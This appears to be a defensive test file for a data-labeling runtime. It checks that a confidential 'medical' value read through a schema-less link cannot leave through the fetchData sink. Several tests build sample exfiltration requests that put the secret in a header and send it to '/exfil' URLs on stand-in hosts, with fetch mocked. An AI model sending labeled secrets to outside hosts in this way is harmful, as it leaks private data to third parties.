import { afterEach, beforeEach, describe, it } from "@std/testing/bdd";
import { expect } from "@std/expect";
import { Identity } from "@commonfabric/identity";
import { internSchema } from "@commonfabric/data-model/schema-hash";
import { StorageManager } from "../src/storage/cache.deno.ts";
import { Runtime } from "../src/runtime.ts";
import { createTrustedBuilder } from "./support/trusted-builder.ts";
import { setPatternEnvironment } from "../src/env.ts";
import { enqueueSinkRequestPostCommitEffect } from "../src/cfc/sink-request.ts";
import { createFrozenRequestSnapshot } from "../src/cfc/request-snapshot.ts";
import type { JSONSchema } from "../src/builder/types.ts";

const signer = await Identity.fromPassphrase("runner-cfc-sink-ceiling-link");
const space = signer.did();

// Audit item 21 follow-up (link-read bypass): the per-sink confidentiality
// ceiling only runs for CFC-relevant transactions, and a labeled value pulled
// through a schema-less link marks nothing — the consuming read schema carries
// no ifc and the top-level read target has no stored metadata, so the
// relevance gate in schema.ts never fires for the nested link target. The
// request then egresses unchecked. These tests pin the leak shut at both the
// handler level (the exact read fetchData's input materialization performs)
// and end-to-end through a real fetchData pattern.
const CONFIDENTIAL_SCHEMA = internSchema(
  {
    type: "object",
    properties: {
      secret: { type: "string", ifc: { confidentiality: ["medical"] } },
    },
    required: ["secret"],
  } satisfies JSONSchema,
  true,
);

const seedConfidentialCell = async (
  runtime: Runtime,
  id: string,
): Promise<void> => {
  const seed = runtime.edit();
  const target = runtime.getCell(space, id, undefined, seed);
  const targetId = target.getAsNormalizedFullLink().id;
  seed.writeOrThrow({
    space,
    scope: "space",
    id: targetId,
    path: [],
  }, {
    value: { secret: "rosebud" },
    cfc: {
      version: 1,
      schemaHash: CONFIDENTIAL_SCHEMA.taggedHashString,
      labelMap: {
        version: 1,
        entries: [{
          path: ["secret"],
          label: { confidentiality: ["medical"] },
        }],
      },
    },
  });
  seed.writeOrThrow({
    space,
    scope: "space",
    id: `cid:${CONFIDENTIAL_SCHEMA.taggedHashString}`,
    path: [],
  }, { value: CONFIDENTIAL_SCHEMA.schema });
  expect((await seed.commit()).ok).toBeDefined();
};

describe("CFC sink ceiling on values pulled through schema-less links", () => {
  let storageManager: ReturnType<typeof StorageManager.emulate>;
  let runtime: Runtime;
  let originalFetch: typeof globalThis.fetch;
  let fetchCalls: Array<{ url: string; init?: RequestInit }>;

  beforeEach(() => {
    storageManager = StorageManager.emulate({ as: signer });
    runtime = new Runtime({
      apiUrl: new URL(import.meta.url),
      storageManager,
      cfcEnforcementMode: "enforce-explicit",
      cfcSinkMaxConfidentiality: { fetchData: [] },
    });

    fetchCalls = [];
    originalFetch = globalThis.fetch;
    globalThis.fetch = ((
      input: string | URL | Request,
      init?: RequestInit,
    ) => {
      const url = typeof input === "string"
        ? input
        : input instanceof URL
        ? input.toString()
        : input.url;
      fetchCalls.push({ url, init });
      return Promise.resolve(
        new Response(JSON.stringify({ mocked: true }), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        }),
      );
    }) as typeof globalThis.fetch;
  });

  afterEach(async () => {
    globalThis.fetch = originalFetch;
    await runtime?.dispose();
    await storageManager?.close();
  });

  it("gates a sink request built from a labeled value read without the ifc gate (handler-level)", async () => {
    await seedConfidentialCell(runtime, "raw-read-secret");

    const tx = runtime.edit();
    const secret = runtime.getCell(space, "raw-read-secret", undefined, tx);
    // getRaw() resolves links on the way to the target and journals a real
    // consumed read of the labeled field, but does NOT route through
    // validateAndTransform's ifc gate — so nothing marks the transaction
    // CFC-relevant. This is exactly the position fetchData is in when its
    // request-recording pass reads the already-resolved input value: the
    // confidentiality is materialized into the request, yet the read alone
    // leaves the transaction un-marked.
    const token = secret.key("secret").getRaw() as string;
    expect(token).toBe("rosebud");
    // Precondition that makes this a faithful reproduction (not the direct-gate
    // path already covered by cfc-sink-ceiling.test.ts): the read left the
    // transaction non-relevant, so only the sink-request relevance trigger can
    // pull it into prepareCfc.
    expect(tx.getCfcState().relevant).toBe(false);

    let released = false;
    enqueueSinkRequestPostCommitEffect(
      tx,
      "fetchData",
      "fetchData:raw-read",
      createFrozenRequestSnapshot({
        url: "https://example.com/exfil",
        options: { headers: { "x-token": token } },
      }),
      "fetchData-start",
      () => {
        released = true;
      },
    );
    runtime.prepareTxForCommit(tx);
    const result = await tx.commit();

    expect(released).toBe(false);
    expect(result.error).toBeDefined();
    expect(String((result.error as Error).message)).toContain(
      "exceeds ceiling for fetchData",
    );
  });

  it("emits the ceiling diagnostic for the same flow in observe mode", async () => {
    // observe mode must still SEE the violation (the whole point of the
    // relevance fix): without it the tx stays non-relevant and prepareCfc
    // never runs, so observe would emit nothing and a deployment couldn't tell
    // a link-laundered egress from a clean one. It commits (observe never
    // rejects) but records the offending (sink, atom).
    const observeStorage = StorageManager.emulate({ as: signer });
    const observeRuntime = new Runtime({
      apiUrl: new URL(import.meta.url),
      storageManager: observeStorage,
      cfcEnforcementMode: "observe",
      cfcSinkMaxConfidentiality: { fetchData: [] },
    });
    try {
      await seedConfidentialCell(observeRuntime, "observe-raw-read");
      const tx = observeRuntime.edit();
      const secret = observeRuntime.getCell(
        space,
        "observe-raw-read",
        undefined,
        tx,
      );
      const token = secret.key("secret").getRaw() as string;
      expect(token).toBe("rosebud");
      expect(tx.getCfcState().relevant).toBe(false);

      enqueueSinkRequestPostCommitEffect(
        tx,
        "fetchData",
        "fetchData:observe-raw-read",
        createFrozenRequestSnapshot({
          url: "https://example.com/exfil",
          options: { headers: { "x-token": token } },
        }),
        "fetchData-start",
        () => {},
      );
      observeRuntime.prepareTxForCommit(tx);
      const result = await tx.commit();

      expect(result.ok).toBeDefined();
      expect(
        tx.getCfcState().diagnostics.some((d) =>
          d.includes("exceeds ceiling for fetchData") && d.includes("medical")
        ),
      ).toBe(true);
    } finally {
      await observeRuntime.dispose();
      await observeStorage.close();
    }
  });

  it("never fires a fetchData pattern request carrying a labeled header (end-to-end)", async () => {
    setPatternEnvironment({
      apiUrl: new URL("http://mock-test-server.local"),
    });
    await seedConfidentialCell(runtime, "pattern-secret");

    const { commonfabric } = createTrustedBuilder(runtime);
    const { pattern, byRef } = commonfabric;
    const fetchData = byRef("fetchData");
    const testPattern = pattern<{ url: string; token: string }>(
      ({ url, token }) =>
        fetchData({
          url,
          mode: "json",
          options: { headers: { "x-token": token } },
        }),
    );

    const tx = runtime.edit();
    const secret = runtime.getCell(space, "pattern-secret", undefined, tx);
    const resultCell = runtime.getCell(
      space,
      "pattern-fetch-result",
      undefined,
      tx,
    );
    const result = runtime.run(
      tx,
      testPattern,
      {
        url: "http://mock-test-server.local/exfil",
        token: secret.key("secret"),
      } as unknown as { url: string; token: string },
      resultCell,
    );
    runtime.prepareTxForCommit(tx);
    await tx.commit();

    await runtime.idle();
    // The fetch (if any) fires from a post-commit effect and writes its result
    // via separate transactions — give those a chance to run, then settle.
    await new Promise((resolve) => setTimeout(resolve, 100));
    await result.pull();
    await runtime.idle();

    // The ceiling for fetchData is empty: a request whose headers carry a
    // value labeled ["medical"] must never reach the network.
    expect(
      fetchCalls.map((call) => call.init?.headers ?? null),
    ).toEqual([]);
  });
});
